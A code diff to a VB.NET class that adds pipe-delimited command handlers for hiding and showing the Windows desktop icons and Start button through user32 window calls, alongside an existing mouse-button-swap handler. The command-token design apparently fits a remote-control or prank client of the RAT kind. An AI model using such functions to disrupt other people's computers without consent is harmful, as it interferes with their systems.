@@ -30,6 +30,25 @@ Public Class MainCL
 
             Await Task.Run(Sub() SwapMB(False))
 
+        ElseIf h(1) = "|HDI|" Then
+
+            HSDesktopIcons(False)
+
+        ElseIf h(1) = "|SDI|" Then
+
+            HSDesktopIcons(True)
+
+
+
+        ElseIf h(1) = "|HSI|" Then
+
+            HSStartIcon(False)
+
+
+        ElseIf h(1) = "|SSI|" Then
+
+            HSStartIcon(True)
+
         End If
 
     End Sub
@@ -50,5 +69,72 @@ Public Class MainCL
     Public Declare Auto Function FindWindow Lib "user32.dll" (lpClassName As String, lpWindowName As String) As IntPtr
     Public Declare Function SwapMouseButton Lib "user32.dll" (Swap As Boolean) As Boolean
 
+
+
+
+
+
+    Public Shared Sub HSDesktopIcons(ByVal l As Boolean)
+        If l = True Then
+
+            Dim handle As IntPtr
+            Dim progManager As IntPtr = FindWindow("Progman", Nothing)
+
+            'If (progManager) ??
+
+            Dim desktop As IntPtr = FindWindowEx(progManager, IntPtr.Zero, "SHELLDLL_DefView", Nothing)
+
+            'If (desktop) ??
+            handle = FindWindowEx(desktop, IntPtr.Zero, "SysListView32", Nothing)
+
+            ShowWindow(handle, 5)
+
+
+        Else
+
+
+
+            Dim handle As IntPtr
+            Dim progManager As IntPtr = FindWindow("Progman", Nothing)
+
+            'If (progManager) ??
+
+            Dim desktop As IntPtr = FindWindowEx(progManager, IntPtr.Zero, "SHELLDLL_DefView", Nothing)
+
+            'If (desktop) ??
+            handle = FindWindowEx(desktop, IntPtr.Zero, "SysListView32", Nothing)
+
+
+            ShowWindow(handle, 0)
+        End If
+    End Sub
+
+    Public Shared Sub HSStartIcon(ByVal l As Boolean)
+        If l = True Then
+
+            Dim progManager As IntPtr = FindWindow("Shell_TrayWnd", Nothing)
+
+            'If (progManager) ??
+
+            Dim desktop As IntPtr = FindWindowEx(progManager, IntPtr.Zero, "Start", Nothing)
+
+            ShowWindow(desktop, 5)
+        Else
+            Dim progManager As IntPtr = FindWindow("Shell_TrayWnd", Nothing)
+
+            'If (progManager) ??
+
+            Dim desktop As IntPtr = FindWindowEx(progManager, IntPtr.Zero, "Start", Nothing)
+
+            'If (desktop) ??
+            'handle = FindWindowEx(desktop, IntPtr.Zero, "SysListView32", Nothing)
+
+
+            ShowWindow(desktop, 0)
+
+        End If
+
+
+    End Sub
 
 End Class
